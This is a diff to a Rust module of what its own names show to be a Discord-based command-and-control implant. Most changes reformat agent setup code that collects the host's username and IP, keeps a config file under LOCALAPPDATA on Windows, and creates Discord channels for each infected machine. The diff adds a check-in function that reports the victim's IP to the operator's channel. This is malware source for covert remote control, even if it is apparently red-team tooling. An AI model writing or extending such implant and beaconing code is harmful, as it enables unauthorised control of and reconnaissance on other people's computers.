@@ -16,6 +16,8 @@ use crate::{
 	discord_utils::channels::*,
 	errors::DiscordC2Error,
 	os::recon_utils::{ip, user},
+	Error,
+	SerenityContext,
 };
 
 #[derive(Serialize, Deserialize)]
@@ -28,12 +30,7 @@ pub struct Agent {
 }
 
 impl Agent {
-	pub fn new(
-		category_channel: ChannelId,
-		command_channel: ChannelId,
-		hostname_user: String,
-		ip_address: String,
-	) -> Result<Agent, DiscordC2Error> {
+	pub fn new(category_channel: ChannelId, command_channel: ChannelId, hostname_user: String, ip_address: String) -> Result<Agent, DiscordC2Error> {
 		let agent = Agent {
 			category_channel,
 			command_channel,
@@ -60,8 +57,7 @@ impl Agent {
 		// the initial agent creation
 		if !config_data.is_empty() {
 			// Deserialize the JSON data into an Agent object
-			let agent = serde_json::from_str(&config_data)
-				.map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
+			let agent = serde_json::from_str(&config_data).map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
 			Ok(Some(agent))
 		} else {
 			// Return null, indicating that this is the initial agent creation.
@@ -77,12 +73,10 @@ impl Agent {
 		file.set_len(0).map_err(DiscordC2Error::from)?;
 
 		// Serialize the Agent object to JSON
-		let agent_json = serde_json::to_string(&self)
-			.map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
+		let agent_json = serde_json::to_string(&self).map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
 
 		// Write the JSON data to the file
-		file.write_all(agent_json.as_bytes())
-			.map_err(DiscordC2Error::from)?;
+		file.write_all(agent_json.as_bytes()).map_err(DiscordC2Error::from)?;
 
 		Ok(())
 	}
@@ -107,10 +101,7 @@ impl Agent {
 	// Getters
 
 	// Setters
-	pub fn set_session_channel(
-		&mut self,
-		session_channel: Option<ChannelId>,
-	) -> Result<(), DiscordC2Error> {
+	pub fn set_session_channel(&mut self, session_channel: Option<ChannelId>) -> Result<(), DiscordC2Error> {
 		self.session_channel = session_channel;
 		self.write()
 	}
@@ -131,8 +122,7 @@ impl fmt::Display for Agent {
 #[cfg(target_os = "windows")]
 fn get_config() -> Result<File, DiscordC2Error> {
 	// Get all the config directory paths
-	let app_data_dir =
-		env::var("LOCALAPPDATA").map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
+	let app_data_dir = env::var("LOCALAPPDATA").map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
 	let config_dir = Path::new(&app_data_dir);
 	let file_path = config_dir.join("config.txt");
 
@@ -175,9 +165,7 @@ pub async fn get_or_create_agent(ctx: &Context) -> Agent {
 		let (hostname, ip) = (user(), ip().await.unwrap());
 
 		// Create the channels
-		let category_id = create_category_channel(ctx, format!("{} - {}", hostname, ip))
-			.await
-			.unwrap(); // TODO: Better error handling
+		let category_id = create_category_channel(ctx, format!("{} - {}", hostname, ip)).await.unwrap(); // TODO: Better error handling
 		let command_id = create_text_channel(
 			ctx,
 			"commands",
@@ -200,4 +188,14 @@ pub async fn get_or_create_agent(ctx: &Context) -> Agent {
 			create_agent(ctx).await
 		},
 	}
+}
+
+/// Sends the agent check in to the proper command channel.
+pub async fn send_agent_check_in(ctx: &SerenityContext) -> Result<(), Error> {
+	let agent = get_or_create_agent(ctx).await;
+	agent
+		.get_command_channel()
+		.send_message(ctx, |m| m.content(format!("Agent checking in from {}", agent.get_ip_address())))
+		.await?;
+	Ok(())
 }
